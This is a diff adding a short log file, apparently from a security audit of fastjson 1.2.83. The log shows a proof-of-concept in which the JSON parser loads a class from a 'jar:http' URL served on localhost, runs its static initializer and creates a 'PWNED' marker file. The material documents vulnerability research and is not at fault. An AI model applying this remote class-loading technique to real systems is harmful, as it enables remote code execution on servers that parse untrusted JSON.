@@ -1,0 +1,11 @@
+[setup] probe jar loaded from /Users/thanatos/Documents/temp/fastjson/_audit/recon/jsontype-poc/probe.jar, 876 bytes
+[setup] fatjar urls = [jar:file:/Users/thanatos/Documents/temp/fastjson/_audit/recon/jsontype-poc/lib/fastjson-1.2.83.jar!/, file:/Users/thanatos/Documents/temp/fastjson/_audit/recon/jsontype-poc/target/classes/]
+[setup] fatClassLoader = org.springframework.boot.loader.LaunchedURLClassLoader
+REMOTE POC <clinit> EXECUTED (class defined from jar:http URL)
+[parse] parsed -> jar:http:..2130706433:18080.probe!.POC jar:http:..2130706433:18080.probe!.POC@2280cdac
+[server] requests: 4
+[server] connection from /127.0.0.1:52457 request: GET /probe HTTP/1.1
+[server] -> served probe.jar (200, 876 bytes)
+[server] connection from /127.0.0.1:52458 request: GET /probe HTTP/1.1
+[server] -> served probe.jar (200, 876 bytes)
+[pwned] PWNED2 exists: true
